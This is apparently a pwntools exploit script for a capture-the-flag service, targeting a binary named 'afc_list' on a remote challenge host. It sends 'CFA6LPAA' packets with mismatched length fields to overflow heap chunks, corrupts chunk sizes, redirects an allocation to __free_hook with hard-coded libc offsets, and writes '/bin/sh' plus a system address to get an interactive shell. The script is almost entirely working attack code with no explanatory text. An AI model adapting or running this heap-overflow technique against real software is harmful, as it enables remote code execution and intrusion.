from pwn import *
import subprocess

context.log_level = "debug"


elf = context.binary = ELF("./afc_list")
# io = remote("localhost", 5000)
io = remote("ppp.chals.sekai.team", 1337)

def get_pid():
    local_port = io.sock.getsockname()[1]
    cmd = f"sudo lsof -n -iTCP:5000 -sTCP:ESTABLISHED | grep socat | grep ':{local_port}'"
    output = subprocess.check_output(cmd, shell=True).decode()
    socat_pid = int(output.split()[1])
    cmd2 = f"pgrep -P {socat_pid}"
    child_pid = int(subprocess.check_output(cmd2, shell=True).decode().strip())
    return child_pid

def gef(pid):
    gdb.attach(pid, gdbscript="""
# break *0x4011f0
""", exe=elf.path)

def gdb_with_pid():
    gef(get_pid())

# gdb_with_pid()

def packet(entire_length,this_length,packet_num,operation):
    return b"CFA6LPAA"+pack(entire_length)+pack(this_length)+pack(packet_num)+pack(operation)

io.recvuntil(b"afc>")
io.sendline(b"ls ")
payload = packet(0x50,0x40,0x1,0x2)
io.send(payload)
io.send(b"A"*(0x50-0x28))

io.recvuntil(b"afc>")
io.sendline(b"ls ")
payload = packet(0x50,0x60,0x2,0x2)
io.send(payload)
io.send(b"A"*(0x50-0x28))


io.recvuntil(b"afc>")
io.sendline(b"ls ")
payload = packet(0x70,0x60,0x3,0x2)
io.send(payload)
io.send(b"A"*(0x70-0x28))


io.recvuntil(b"afc>")
io.sendline(b"ls ")
payload = packet(0x40,0x60,0x4,0x2)
io.send(payload)
io.send(b"A"*(0x40-0x28)+pack(0x31))


io.recvuntil(b"afc>")
io.sendline(b"ls ")
payload = packet(0x70,0x60,0x5,0x2)
io.send(payload)
io.send(b"A"*(0x70-0x28))

libc_base = 0x00007ffff7d65000
free_hook = libc_base+0x0000000001eee48
one_gadget = libc_base+0xe3b04



io.recvuntil(b"afc>")
io.sendline(b"ls ")
payload = packet(0x40,0x60,0x6,0x2)
io.send(payload)
io.send(b"A"*(0x40-0x28)+pack(0x31)+pack(free_hook-0x8))



io.recvuntil(b"afc>")
io.sendline(b"ls ")
payload = packet(0x40,0x60,0x7,0x0)
io.send(payload)
io.send(b"A"*(0x40-0x28)+pack(0x51))

# #malloc 0x31 bytes

io.recvuntil(b"afc>")
io.sendline(b"ls ")
payload = packet(0x50,0x60,0x8,0x0)
io.send(payload)
io.send(b"A"*(0x50-0x28))



io.recvuntil(b"afc>")
io.sendline(b"ls ")
payload = packet(0x50,0x60,0x9,0x0)
io.send(payload)
# payload = b"/readflag sekai ppp"
payload = b"/bin/sh\x00"
# payload+=b"\x00"*(0x28-len(payload))
payload += pack(libc_base+0x0000000000052290)
print(len(payload))

io.send(payload)








io.interactive()
